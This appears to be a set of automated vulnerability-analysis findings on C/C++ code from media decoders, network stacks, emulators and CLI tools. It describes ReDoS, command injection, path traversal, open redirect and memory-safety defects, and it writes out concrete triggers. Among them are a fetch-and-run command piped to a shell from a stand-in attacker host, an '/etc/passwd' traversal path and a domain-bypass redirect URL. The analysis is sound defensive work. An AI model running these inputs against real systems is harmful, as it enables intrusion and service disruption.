verdict.summary: The backend compiles a raw user-supplied pattern into a std::regex (a backtracking engine) and runs regex_search over user-supplied content with no complexity, length, or time bound; a nested-quantifier pattern such as '(a+)+$' against ~32 a's causes exponential backtracking, so a tiny request hangs the service (ReDoS). The catch clause only handles construction-time regex_error and cannot prevent the runtime blowup.

evidence.snippet:
std::regex safePattern(pattern);  // Sanitize user input
        return std::regex_search(content, safePattern);
evidence.reason: Root cause: the unmodified attacker-supplied 'pattern' is compiled into a backtracking std::regex and matched against attacker-supplied 'content' with no guard on pattern complexity, input length, or match time. Trigger (fully instantiated): pattern='(a+)+$', content=32*'a'+"b" — compiles without throwing (so the regex_error catch on line 20 never engages), then regex_search explores exponentially many partitions of the 32-a run, hanging the process. Both values are user-specified per the quoted docstring ('@param pattern The pattern to search for, specified by a user'), making this attacker-scalable amplification against a Web API backend.

assumptions: std::regex (libstdc++/MSVC) uses recursive backtracking and exhibits exponential time on nested unbounded quantifiers; this is documented, well-known behavior of the standard library (discipline 3), not a project-internal callee.
main() is a local harness for the documented Web API entry point; the security-relevant trust boundary is the searchPattern parameters, which the docstring states are user-specified.
limitations: main() reads argv[1]/argv[2] without checking argc (lines 26-27); invoking the binary with no arguments dereferences a NULL argv entry. This crashes only the operator's own process at equal privilege with no corruption, disclosure, or amplification, so it is a robustness issue, not a vulnerability.

The comment 'Sanitize user input' on line 18 is misleading (compiling a raw user regex is not sanitization), but no security decision or security-state presentation rests on it, so it is not counted as a finding.

verdict.summary: The exported, non-static function execute_command(const char* command) passes its data-carrying command parameter directly to popen(command, "r") with no validation, allowlisting, or sanitization anywhere in the code, allowing arbitrary OS command injection whenever any caller supplies an untrusted command string; the only checks in the function (fp == NULL, output == NULL) run after the shell has already executed the value.

evidence.reason: Root cause: the command parameter of the non-static, externally visible execute_command() is attacker-controlled data (discipline 4: content-bearing parameter of an exported function) and is forwarded unvalidated to popen, which executes it through /bin/sh. Trigger: a caller passing e.g. command = "curl http://attacker/x | sh" reaches line 52 with the raw string, and popen executes it — arbitrary command execution. No guard on any path (the fp == NULL check at line 53 only observes the execution result).

assumptions: popen has its documented semantics: runs the command via the shell and returns a stream or NULL.
execute_command is treated as provided (its forward declaration at line 7 and definition at line 50 are both part of this code's public surface).
limitations: mkstemp return value is never checked ('int fd = mkstemp(param_filename);' line 21); if mkstemp fails, param_filename remains the literal '/tmp/tempXXXXXX' and is used in system()/remove(), enabling a predictable-path file-clobber if a local attacker pre-plants that path — but the trigger requires mkstemp failure (environment/OS condition no attacker is shown able to induce), so it is speculative.
fclose(fp) is used on a popen stream instead of pclose (lines 78, 64, 71 region) — child process is not reaped / formally undefined; robustness issue only.

output = realloc(output, buffer_size) discards the original pointer on allocation failure (memory leak); fd from mkstemp is never closed (descriptor leak) — resource leaks with no security impact shown.

The buffer-growth loop was verified safe: 'if (total_read >= buffer_size) { buffer_size *= 2; ... }' runs before each subsequent fread, so on loop exit total_read < buffer_size and output[total_read] = '\0' is in-bounds.

Within this translation unit, main() calls execute_command only with an internally constructed benign command; the CWE-78 finding rests on the exported-function attacker model, which is why confidence is not higher.

verdict.summary: The sscanf return value is never checked in the hex-decoding loops, so non-hex input from argv leaves malloc'd key/data bytes uninitialized; the indeterminate heap bytes are then copied into the AES key (memcpy(result.key, key, 16)) and printed to stdout, and uninitialized data bytes are encrypted and emitted — an uninitialized-value-to-output defect with heap-content disclosure potential.

evidence.reason: Root cause: sscanf's return value is unchecked, so a non-hex argv[1] (e.g. "zzzz...") makes sscanf fail to write key[i], leaving malloc'd heap bytes uninitialized; no statement in the code checks the sscanf result or initializes the buffer. Trigger fully instantiated: key_len=16 passes the line-49 guard, and the indeterminate bytes are copied into the AES key at memcpy(result.key, key, 16) and printed at printf("%02x", result.key[i]).

Same defect on the data path: non-hex argv[2] leaves data[i] uninitialized; these indeterminate heap bytes are encrypted by AES_cbc_encrypt and emitted as 'ciphertext', and they also flow into pad_data's memcpy, propagating uninitialized memory to output.

assumptions: sscanf leaves the destination byte unwritten on match failure (standard documented semantics; returns 0/EOF without storing).
glibc/other malloc returns uninitialized memory (no calloc/zeroing anywhere in the code).
limitations: pad_data's data_len + padding can only overflow at SIZE_MAX-scale lengths, unreachable because data_len is bounded by strlen(argv[2])/2 ≤ ARG_MAX/2 — not a vulnerability here.
CBC-without-MAC and printing the raw key to stdout are properties of the specified exercise design, not an instantiated defect.
RAND_bytes is used without including openssl/rand.h (compile-level issue, not a security defect).
Fresh-process heap limits the practical disclosure value of the uninitialized bytes; impact is rated low.

verdict.summary: gnrc_sixlowpan_iphc_recv copies packet payload with length `sixlo->size - payload_offset`, where payload_offset is an unchecked parse result of the attacker-supplied IPHC header. No statement in this code enforces payload_offset <= sixlo->size, and the only write-bound check (`ipv6->size < uncomp_hdr_len + (sixlo->size - payload_offset)`) is defeated by size_t wraparound: with payload_offset = sixlo->size + k (k <= uncomp_hdr_len) it evaluates to a small value the buffer satisfies, after which memcpy copies ~SIZE_MAX bytes — an unbounded out-of-bounds read and write in the node's network stack, triggered by a single crafted 6LoWPAN fragment from a network peer.

evidence.reason: Sink: the memcpy length `sixlo->size - payload_offset` underflows in size_t whenever the IPHC/NHC decoding helpers return payload_offset > sixlo->size (truncated/malformed attacker frame); the source pointer also reads past the sixlo snip. The only preceding bound check (line 169) wraps identically and passes, so the trigger at payload_offset = sixlo->size + 1, sixlo->size = 48, uncomp_hdr_len = 40 yields check `ipv6->size < 39` failing and a memcpy of SIZE_MAX bytes — out-of-bounds write reachable pre-auth from any radio peer.

Origin of the tainted value: payload_offset is the parse result over the attacker-controlled frame `iphc_hdr = sixlo->data`, and the only validation anywhere in this code is the failure-sentinel test `payload_offset == 0`. No statement in this function bounds payload_offset against sixlo->size before it is used as an index (line 54) and as a copy-length operand (lines 138, 169, 182); the missing guard `if (payload_offset > sixlo->size) { drop; }` appears nowhere in any form.

assumptions: The internal decode helpers _iphc_ipv6_decode/_iphc_nhc_ipv6_decode/_iphc_nhc_udp_decode are not shown; their return value payload_offset is treated as an unchecked parse result that this code must bound (last-line-of-defense), since this function owns sixlo->size and performs the copy.
rbuf->super.datagram_size, current_size and offset_diff are populated by fragment-reception code (not shown) from attacker-controlled fragment-header fields and are treated as attacker-influenced.
Analysis covers all compile-time branches (MODULE_GNRC_SIXLOWPAN_FRAG_VRB / SFR / IPHC_NHC); the non-VRB rbuf path is exploitable without any optional module.
limitations: SFR path arithmetic underflow: line 105 `payload_len = (rbuf->super.datagram_size - payload_offset) + (uncomp_hdr_len - sizeof(ipv6_hdr_t))` and lines 111-112 corrupt datagram_size/offset_diff bookkeeping when the attacker's datagram_size < payload_offset; with an in-bounds payload_offset the memcpy itself stays bounded, and the corrupted reassembly state is consumed by reassembly/forwarding code not shown, so the impact chain is not instantiated here.
Line 117 `payload_len = (uint16_t)(rbuf->super.datagram_size - sizeof(ipv6_hdr_t))` underflows for attacker datagram_size < 40, misrepresenting ipv6_hdr->len; downstream IPv6 consumers are not shown.
uint16_t truncation of payload_len (line 157) requires a sixlo snip >= ~64KB, which typical GNRC packet buffers cannot hold — deployment assumption, not instantiated.
The 1-byte OOB read at `iphc_hdr[payload_offset]` (line 54) occurs under the same trigger as the primary finding and is subsumed by it.
assert()-based NULL checks (lines 4, 18, 35, 38) vanish under NDEBUG — robustness only.

verdict.summary: read_file_from_dir builds the path with unchecked concatenation (dir_path + "/" + filename) and opens it with std::ifstream without validating that filename is a plain name confined to dir_path. An attacker-supplied filename containing '../' segments or an absolute path escapes the intended directory, and the file's contents are printed to stdout (std::cout << content), yielding an arbitrary file read outside the documented 'read the file from the directory' contract.

evidence.reason: Path traversal: file_path is formed by raw concatenation of the attacker-controlled filename (parameter of the exported function, forwarded from argv[1] at line 41) onto dir_path, with no check for '../' segments, absolute paths, or canonical containment; std::ifstream then opens it. Trigger: filename="../../../etc/passwd", dir_path="/var/app/data" gives file_path="/var/app/data/../../../etc/passwd", which opens /etc/passwd; the contents are read (line 29) and printed (line 43). The only guard, 'if (!file.is_open())', tests openability, not confinement.
Origin/disclosure link: argv[1] is passed as the unvalidated filename, and the traversed file's contents are written to stdout, completing the arbitrary-file-read impact chain.

limitations: When invoked only as this exact CLI by a local user on their own account, the practical impact is limited to reading files the same user could already open; the finding rests on the exported read_file_from_dir being the trust-boundary intake point for the filename it fails to confine.

verdict.summary: In the FF_B_TYPE case, the decoder-state pointer next = s->next_picture.data[0] is guarded only by assert(next), which is not a runtime guard in release builds; when a crafted/corrupted MPEG stream presents a B picture with no populated next_picture, next is NULL and next->surface dereferences NULL, crashing (DoS) the process decoding attacker-supplied media. The sibling reference last is properly NULL-checked at runtime (if (!last) last = render;), proving the missing guard is the defect.

evidence.reason: Root cause: next is assigned from s->next_picture.data[0] with no runtime NULL check; the only guard is assert(next), a debug-only construct (no-op under NDEBUG, abort() otherwise). Trigger: attacker-controlled picture coding type FF_B_TYPE (parsed from the stream's picture header) reaches this case when next_picture.data[0] is NULL (e.g., truncated/corrupted stream with no following reference frame — the exact NULL condition the code itself defends against for the sibling 'last' via 'if (!last) last = render;'), causing a NULL read at next->surface and a decoder-process crash on attacker-supplied media.

assumptions: assert() is compiled out under NDEBUG in release builds; even when enabled it aborts, so it does not keep next inside its required non-NULL domain.

s->next_picture.data[0] is a decoder-state pointer that this code's own NULL check on the analogous s->last_picture.data[0] ('if (!last)') establishes as NULLable in this context; no quoted statement guarantees it is populated for B pictures.

ff_vdpau_add_data_chunk is an internal callee not shown; its documented role is appending the chunk to a driver bitstream buffer it sizes itself, so the buf/buf_size pass at line 43 could not be proven to cause an out-of-bounds access at this call site.
The quantizer matrices copied in the i<64 loop are fixed 64-entry tables (MPEG/VDPAU spec), so that loop is in-bounds.
limitations: Secondary pattern: render = s->current_picture_ptr->data[0] is also guarded only by assert(render); however, the runtime check 'if (!s->current_picture_ptr) return;' covers the outer pointer and no statement in this code instantiates data[0] == NULL, so a trigger for that dereference could not be proven.

buf_size is passed unvalidated into ff_vdpau_add_data_chunk; since the callee (not shown) owns its bitstream-buffer sizing and reallocates as it appends, an out-of-bounds copy could not be instantiated from the given code.
slice_count is stored to the driver-facing info struct without range validation; no memory or index operation in this code consumes it, so any misuse would occur in a consumer not shown.
No memory-corruption (write) primitive is simulated: the confirmed defect is a NULL read/crash of the decoding process, i.e., a denial of service.

verdict.summary: The exported API consumes caller-supplied port data (fps numerator/denominator, format id) with no validation. With fps.denum=0 and a port frame rate nominally higher than the bridge's, the PJ_LOG argument '(int)(fps->num/fps->denum)' (line 66) executes an integer division by zero, crashing the process. Separately, every error return after pj_mutex_lock (lines 39, 43, 82, 92) returns without pj_mutex_unlock, permanently retaining the bridge mutex and deadlocking all subsequent bridge operations (e.g., the unrecognized-format path, attacker-triggerable via port->info.fmt.id).

evidence.snippet:
PJ_LOG(3,(THIS_FILE, "Warning: frame rate of port %s is higher "
			 "than video conference bridge (%d > %d)",
			 name->ptr, (int)(fps->num/fps->denum),
evidence.reason: Integer division by zero: fps->num/fps->denum executes with fps->denum possibly 0 because no code path validates the caller-supplied port frame rate (lines 12-15 check only fmt.type and detail_type). Instantiated trigger: fps={num:1, denum:0} makes line 58-59 compute ts_interval=(uint32)(TS_CLOCK_RATE*1.0/1*0)=0, so the line-62 branch (0 < vconf_interval) is taken and the division 1/0 crashes the process with SIGFPE.

Origin of the tainted divisor: fps is taken directly from the attacker-supplied port parameter with no range, zero, or sanity check; this computation produces the 0 value of ts_interval that gates entry into the divide-by-zero log branch.

Improper locking: the mutex taken at line 22 (pj_mutex_lock(vid_conf->mutex)) is never released on this return path — the only pj_mutex_unlock calls in the function are at lines 26 and 139. An attacker-supplied port with an unrecognized format id reaches this return (instantiated: vfi==NULL), leaving vid_conf->mutex locked forever, so all subsequent conference-bridge operations by any thread block permanently (denial of service). The same defect exists at the apply_fmt failure return (lines 88-92) and the PJ_ASSERT_RETURN paths (lines 39, 43).

assumptions: TS_CLOCK_RATE is a positive constant (pjmedia convention 90000); only its positivity is needed for the simulation.

PJ_LOG(3,...) arguments are evaluated in typical pjproject builds (PJ_LOG_MAX_LEVEL >= 3); if level-3 logging is compiled out, the divide-by-zero at line 66 is not executed, though the mutex-retention defect remains.
pjmedia_get_video_format_info returning NULL for an unknown format id and apply_fmt returning a non-success status are documented sentinels of those characterizable pjmedia calls.
limitations: ports[index] out-of-bounds write if index==max_slot_cnt (line 31-35, only a pj_assert): requires vid_conf->port_cnt to be inconsistent with the ports array, which only the not-shown port-removal path could produce; this function's own lines 133-134 keep them consistent.

Unchecked pj_pool_zalloc for put_buf/get_buf (lines 96, 100): NULL only on allocation failure, which the attacker cannot induce; put_buf_size==0 (framebytes 0) yields a pool pointer, not a fault here.

ts_interval formula multiplies by fps->denum instead of dividing (line 58-59): logic/correctness bug; low values are clamped at line 63 and oversized values are consumed in code not shown, so impact is not instantiated here.
pool/cport allocated before the error returns at lines 82/92 leak (minor resource leak in the parent pool); not a memory-safety defect.

vid_conf->opt.frame_rate==0 would make vconf_interval an implementation-defined cast of floating-point infinity (line 55-57); frame_rate is set at conference creation (code not shown) and no crash occurs at this line, so not promoted.

verdict.summary: In get_codec_data (NUV/MythTV demuxer), the NUV_EXTRADATA branch dereferences vst->codec without any NULL check on vst, even though the code elsewhere explicitly handles vst==NULL ('if (!vst && !myth)' only returns when myth is 0, and the MYTHEXT arm tests 'if (vst)'). A crafted MythTV-flagged file with no video stream reaches 'vst->codec->extradata_size = size;' with vst==NULL, crashing the parser. Additionally, the av_malloc(size) result is never checked before being passed as the destination to get_buffer(pb, vst->codec->extradata, size) with a fully attacker-controlled 32-bit size, so an allocation failure yields a NULL destination for a large copy. Both are attacker-triggerable denial of service / memory-safety defects with no guard on any path.

evidence.reason: Root cause: missing NULL guard on vst. The only early check, 'if (!vst && !myth) return 1;' (line 4), deliberately admits vst==NULL when myth!=0, and the only other vst-NULL handling ('if (vst)' in the NUV_MYTHEXT arm) is unreachable from this switch arm. Trigger: attacker crafts a MythTV NUV file (myth=1) with no video stream (vst==NULL) containing an NUV_EXTRADATA frame with subtype 'R'; execution passes line 4, parses size, and executes 'vst->codec->extradata_size = size;' with vst==NULL, an immediate NULL pointer dereference that crashes the demuxing process.

evidence.snippet:
vst->codec->extradata = av_malloc(size);
                    get_buffer(pb, vst->codec->extradata, size);
evidence.reason: Root cause: unchecked allocation result used as the destination of an attacker-sized copy. size = PKTSIZE(get_le32(pb)) is a fully attacker-controlled 32-bit value (up to ~2 GB); av_malloc may return NULL for such sizes (allocation functions return a pointer or NULL), and no 'if (!extradata)' sentinel test, clamp, or size bound exists on any path before get_buffer(pb, vst->codec->extradata, size) is called with a NULL destination and attacker-controlled length, crashing the process at/inside the copy.

assumptions: myth and vst/ast are produced by the not-shown caller (nuv demuxer header parsing): myth reflects the file's MythTV marker and vst is NULL when the file declares no video stream; the code's own handling of NULL streams ('if (!vst && !myth)' and 'if (vst) ... else url_fskip(pb, 4)') documents that these states are in-domain inputs, so the missing check in the EXTRADATA branch is this code's defect.
The PKTSIZE macro definition is not shown; it is assumed only to round/mask the 32-bit size, still leaving large attacker-controlled values.
av_malloc and get_buffer follow standard semantics: allocation returns pointer or NULL; get_buffer copies bytes from the stream into the destination buffer.
limitations: extradata_size is set to the full attacker size before get_buffer, which may short-read at EOF; the resulting partially-uninitialized extradata is consumed by a decoder stage not shown, so that information-disclosure impact is not instantiated here.

In the default switch arm, a negative int from PKTSIZE(get_le32(pb)) passed to url_fskip(pb, size) can seek backwards, potentially re-parsing data, but no memory-corruption, disclosure, or amplification impact was demonstrated.

verdict.summary: No attacker-instantiated vulnerability found. All attacker-reachable sinks (IMF rate-limit array index, image->comps[1] access, callee return values feeding encode flow) are protected by quoted guards that hold in execution order. The unguarded uses that exist — load_images(dirptr,...) called despite a possibly-NULL dirptr after malloc, and dirptr->filename[i] written after an unchecked calloc — are reachable only via allocation failure, which no attacker input in this code can induce, and the directory-count race between get_num_images and load_images has its potential out-of-bounds effect inside a callee not shown.

assumptions: parse_cmdline_encoder, get_num_images, load_images, get_next_file, and the image decoders are project-internal callees not shown; their internal bounds/NULL behavior is assumed only where this code's own flow cannot produce a harmful value.
OPJ_IMF_MAINLEVEL_MAX is assumed to be 11, matching the 12-entry limitMSamplesSec initializer array literal shown in the code.
opj_stream_destroy and the opj_* library functions are standard OpenJPEG public APIs with documented NULL/return-value semantics (checked at each call site here).
parameters.cod_format is set only by parse_cmdline_encoder; no statement in this code modifies it across loop iterations.
limitations: load_images(dirptr, img_fol.imgdirpath) is called outside the 'if (dirptr)' guard: if the initial malloc(sizeof(dircnt_t)) fails, a NULL pointer is passed to load_images. Robustness issue only — allocation-failure trigger, no attacker-controlled producer.

dirptr->filename (the calloc of the pointer array) is never NULL-checked before the loop 'dirptr->filename[i] = dirptr->filename_buf + i * OPJ_PATH_LEN;' writes through it; only dirptr->filename_buf is checked. Same allocation-failure-only trigger.
The 'num_images == 0' (folder empty) check executes after load_images has already been called with buffers sized for zero entries; harm depends on unshown load_images behavior.

TOCTOU: get_num_images counts directory entries and load_images re-reads the directory later; a concurrent writer could change the count, but any resulting out-of-bounds write would occur inside load_images, which is not shown and not a characterizable standard callee.

The cod_format default arm calls opj_stream_destroy(l_stream) where l_stream may be a dangling pointer from a prior iteration's destroy; not reachable because parameters.cod_format is constant across iterations.
Error paths for the directory buffers and load_images failure set ret = 0 (process exit code success); misrepresents failure to any external script consumer, but that consumer is outside this code.
The bUseTiles code path (opj_write_tile loop, and a %d format used with unsigned int i) is dead code because bUseTiles is the constant OPJ_FALSE.

verdict.summary: get_netloc extracts the authority only up to the first '/', but real URL parsing ends the authority at '?', '#', and '\\'. An attacker-supplied target such as 'https://evil.com?.example.com' yields netloc 'evil.com?.example.com', which passes the '.domain' suffix check (ends with 'example.com' preceded by '.'), so the raw attacker URL is returned as the validated in-domain redirect target. A browser parses its host as evil.com (query '.example.com'), producing an open redirect / trust-boundary validation bypass.

evidence.reason: The in-domain decision is a pure string suffix test on target_netloc. With target='https://evil.com?.example.com' and domain='example.com': netloc size 21 > 11; compare(10,11,"example.com") == 0 (indices 10-20 spell 'example.com'); netloc[9]=='.' — all conditions true, so result = the raw attacker URL. Standard URL parsing ends the authority at '?', so the actual host is evil.com; the function returns it as the verified redirect target, bypassing the domain allowlist (open redirect).

Origin of the faulty value: the netloc is copied only until '/' and never stops at '?', '#', '\\' or '@' (authority terminators under standard URL parsing), allowing the attacker to place an arbitrary host before a fake '.domain' suffix. This is the only statement constraining authority characters; no other guard anywhere in the code bounds the extracted host.

assumptions: The returned string is consumed as a redirect destination, per the function's own documentation (lines 29-30: 'return the target URL for redirect'); the CLI harness only prints it, but the quoted contract establishes the intended use.
Browser/RFC 3986 authority parsing (authority ends at first '/', '?', '#' or '\\'; userinfo before '@' ignored for host) is relied on as universally known semantics.
limitations: When the check passes, the target's original scheme is returned verbatim (e.g., 'http://example.com'), violating the documented 'Use https protocol' requirement; same-domain, no cross-domain impact.

Edge case: with an empty domain string, the suffix branch reduces to 'netloc ends with .', so any dotted netloc (e.g., 'https://evil.com.') is accepted; this requires a degenerate/empty trusted-domain configuration and was not counted as a primary trigger.

Memory safety verified sound: url[start] is guarded by 'start < url.size()' (line 19) and the index 'target_netloc.size() - domain.size() - 1' (line 56) is guarded by 'target_netloc.size() > domain.size()' (line 54) evaluated first via short-circuit; no out-of-bounds access exists.

verdict.summary: Binary (CD_FLAG_BIN) problem-data items bypass the only path-safety check in the function: the 'name[0]=='.\' || strchr(name,'/')' validation at line 91 is unreachable for them because of the 'continue' at line 87. Consequently the attacker-controlled field name is used directly as a destination path component ('concat_path_file(dd->dd_dirname, name)') and the attacker-controlled 'value->content' as the copy source ('copy_file(value->content, dest, DEFAULT_DUMP_DIR_MODE | S_IROTH)'), enabling path traversal outside the dump directory: arbitrary file write to an attacker-chosen path and arbitrary privileged file read copied to a world-readable (S_IROTH) destination.

Guest-controlled DMA frame address, context, and count are consumed, but the only memory-relevant sink in this code (assignment of cmd->pa_size and handoff of cmd->frame) is protected by the quoted guard `if (frame_size_p != frame_size) { ... return NULL; }`, which runs in execution order before first use, catches the NULL-map failure sentinel (plen set to 0) and partial mappings on the same variable and unit, and unmaps/resets state before returning. The residual defect — cmd->pa is not reset when pci_dma_map returns NULL (the reset `cmd->pa = 0;` sits inside `if (cmd->frame)`), leaving a poisoned slot {pa set, frame NULL} — cannot be driven to an instantiated impact within the given code: it requires a bounce-buffer race whose window is not exhibitable here plus lookup and dereference steps in callee/caller code that is not shown.

assumptions: megasas_next_frame (line 8) and megasas_use_queue64 are project-internal callees not shown; their lookup/config semantics are assumptions. The NULL return of megasas_next_frame is checked at `if (!cmd) { return NULL; }`.

pci_dma_map/address_space_map semantics per documented platform behavior: returns NULL with *plen set to 0 on failure, actual mapped length (≤ requested) in *plen otherwise; this makes `frame_size_p != frame_size` catch every failure sentinel.

The caller that consumes the returned MegasasCmd (frame parsing/completion) and megasas_unmap_frame are not shown; whether a bounce-held mapping or an in-flight command survives between two invocations is unknown from the given code.
limitations: State-poisoning candidate (real state bug, not instantiated as a vulnerability here): on the NULL-map arm of `if (frame_size_p != frame_size)`, the reset `cmd->frame = NULL; cmd->pa = 0;` is only inside `if (cmd->frame)`, so a failed map (pci_dma_map returns NULL, plen → 0, reachable only when the global bounce buffer is busy — a race with a prior bounce-path map whose hold time is determined by not-shown unmap code) leaves cmd->pa = frame with cmd->frame == NULL. A guest re-issuing the same frame could then receive a cmd with a NULL frame if megasas_next_frame's lookup (not shown) returns the poisoned slot, and the crash would land in the not-shown caller's dereference of cmd->frame. Precondition not instantiable in the given code (race window and both downstream links unquotable); the one-line fix — reset cmd->pa on the NULL arm — appears nowhere in this code.

Reissued-frame candidate: when cmd->pa is already set, this code overwrites `cmd->count = count;` and increments `s->busy++` on a possibly in-flight command with no busy check in this code; any double-completion/UAF consequence depends entirely on not-shown lookup and completion logic.

`s->busy++` is an unbounded signed int incremented on every enqueue; guest could overflow it after ~2^31 MMIO writes, but every consumer of s->busy is outside the given code, so no impact is instantiated.

verdict.summary: combine_residual_frame validates the core shift only against the upper bound (`if (shift > 24)`) but never checks the lower bound. `shift = 24 - c->pcm_bit_res + chs_get_lsb_width(...)` is computed from bitstream-parsed fields with no quotable bound in this code, so a crafted DCA:XLL stream can make `shift` negative, and `(src[n] + round) >> shift` (and the `mul16(...) >> shift` variant) then perform a shift with a negative count — undefined behavior in the decoder triggered by attacker-supplied media (UBSan: 'shift exponent too large'; garbage output or sanitizer abort).

evidence.snippet:
shift = 24 - c->pcm_bit_res + chs_get_lsb_width(s, c, 0, ch);
        if (shift > 24) {
evidence.reason: Root cause: the guard checks only `shift > 24`; nothing in the code enforces `shift >= 0`. `c->pcm_bit_res` is bitstream-parsed attacker-data with no quotable bound here and chs_get_lsb_width's range is not documented in this code, so shift can be negative (e.g. pcm_bit_res=30, lsb width 0 → shift = -6), passing the only shift check and reaching the `>> shift` sinks with an invalid negative shift count.

evidence.snippet:
for (n = 0; n < nsamples; n++)
                dst[n] += (unsigned)((src[n] + round) >> shift);
evidence.reason: Sink: right shift by the negative `shift` value (likewise line 48's `(mul16(src[n], scale_inv) + round) >> shift`) — undefined behavior per C11 6.5.7, triggered by a crafted XLL stream (round=0 when shift<=0; the `if (shift > 24)` check does not reject negative shift). The missing one-line guard is `shift < 0` rejection, which appears nowhere in the code.

assumptions: `c->bands[0].msb_sample_buffer[ch]` is allocated to hold at least `s->nframesamples` samples (allocation not shown in the given code); the `nsamples != dca->core.npcmsamples` check ties the loop bound to the core buffer.
`ff_dca_core_map_spkr` returns an in-range index into `dca->core.output_samples` for non-negative results (callee not shown); only the `< 0` failure sentinel is checkable here.
`c->nchannels` and `c->ch_remap` sizing are validated at parse time not shown; treated as attacker-data with no quotable bound per guard anchoring.
No quotable bound on `c->pcm_bit_res` or on the return of `chs_get_lsb_width` exists in the given code, so `shift` is treated as able to go negative.
limitations: `o->dmix_scale_inv[c->hier_ofs + ch]` (line 46) uses an attacker-derived index with no guard in this code; an out-of-bounds read could not be simulated because the allocation size of `dmix_scale_inv` and any parse-time validation of `hier_ofs` are not shown, so the trigger precondition could not be instantiated from the given code.

If the not-shown parser provably restricted `pcm_bit_res <= 24` and `chs_get_lsb_width >= 0`, `shift` could never be negative and the UB would be unreachable; per guard anchoring that bound is unquotable from the given code, and real-world fuzzing of this exact FFmpeg code reached the negative shift (fixed upstream by adding `shift < 0` to the check).

verdict.summary: encrypt_data uses a hardcoded constant IV ("0123456789abcdef") for AES-CBC encryption instead of a random, per-message IV. Any two messages encrypted with the same key produce identical ciphertexts for identical plaintext prefixes, destroying CBC's semantic security and leaking plaintext equality/patterns to any observer of the ciphertext. No randomness source exists anywhere in the code.

evidence.snippet:
// Use a fixed IV for simplicity
    memcpy(result.iv, "0123456789abcdef", AES_BLOCK_SIZE);
evidence.reason: The IV allocated at line 54 is filled with a fixed compile-time constant rather than a cryptographically secure random value. This constant IV is copied (line 99) and passed to AES_cbc_encrypt (lines 100-101) on every invocation, so identical plaintexts under the same key always yield identical ciphertexts (deterministic encryption, first-block pattern leakage). Trigger fully instantiated: any valid call with key_len >= 16 passes the line 49 check and reaches this sink; the code contains no RAND_bytes/rand call anywhere that could make the IV unique or unpredictable.

assumptions: The docstring claim 'The provided key bytes is long enough (>= 64 bytes)' (line 33) is not enforced anywhere; the code itself only enforces key_len >= 16 (line 49), which is sufficient for the 16-byte key copy at line 66.
sscanf("%2hhx") semantics per discipline 3: it converts at most 2 hex digits and returns 0/EOF without storing on non-hex input.
limitations: Secondary defect (not verdict-driving): the return values of the sscanf calls at lines 129 and 134 are ignored; on non-hex input, key[i]/data[i] remain uninitialized malloc'd bytes that are then copied into result.key (line 66) and printed to stdout (lines 159-161), leaking uninitialized heap contents — but only to the same-privileged user who invoked the process, so the cross-boundary impact is not instantiated (CWE-457).
Odd-length hex arguments are silently truncated by the strlen/2 computation (lines 115-116); correctness issue only.
The key is printed to stdout by design (doc line 34), which is a questionable practice for a CLI tool but matches the documented contract.

verdict.summary: gen_mtsr gates the privileged mtsr operation on the guest problem-state bit with an unconditional early return (gen_inval_exception + return) on the unprivileged path, and in CONFIG_USER_ONLY builds the store-helper path is compiled out entirely. The SR and rS values passed to gen_helper_store_sr are fixed-width instruction fields (SR is 4 bits, in bounds of the 16 segment registers), and no memory, index, or injection sink in this code consumes an out-of-domain attacker value.

assumptions: The decode macro SR() masks the opcode's SR field to 4 bits (values 0-15) and rS() to 5 bits (0-31), per PowerPC instruction encoding; the macro bodies are not part of the given code.
gen_helper_store_sr / helper_store_sr, defined outside this snippet, performs any actual array indexing and is assumed to index env->sr[16] with the masked SR value.
tcg_const_tl aborts internally on allocation failure (standard TCG behavior), so its return value needs no NULL check here.
limitations: On 64-bit PowerPC implementations mtsr is an illegal instruction in hardware, but this translator emits the store-SR helper without checking the 64-bit-mode flag (ctx->sf). This is an emulation-accuracy discrepancy, not memory corruption: the SR index remains bounded and helper semantics (not shown) apply.
If the not-shown SR() macro or helper_store_sr mishandled the field, the defect would live in those, not in this function; no unchecked offset, size, or pointer is passed at any call site here.

verdict.summary: Attacker-controlled signature-header tag data (td.type, td.count, td.data from headerGet on the parsed sigh) reaches the headerPut sink only after explicit type-match, count-range (1..16MiB), and exact-arity guards, each of which breaks out of the loop before the sink with no bypass path. The error path sets msg and returns the non-zero tag, correctly signaling invalidity (fail-closed). No memory, injection, or authorization sink is reachable with an out-of-domain value produced by this code's own flow.

assumptions: xlateTags is a static, program-defined table terminated by a NULL stag entry; its stag/xtag/count fields are constants, not attacker data.

headerGet, headerPut, headerIsEntry, rpmTagGetTagType, rpmtdFreeData, rasprintf, and rpmTagGetName are project-internal callees whose semantics are not shown; standard-callee-style reliance is limited to documented RPM API contracts.
td.data consistency with td.count is established by the unseen headerGet; this code contains no statement producing a mismatched td.
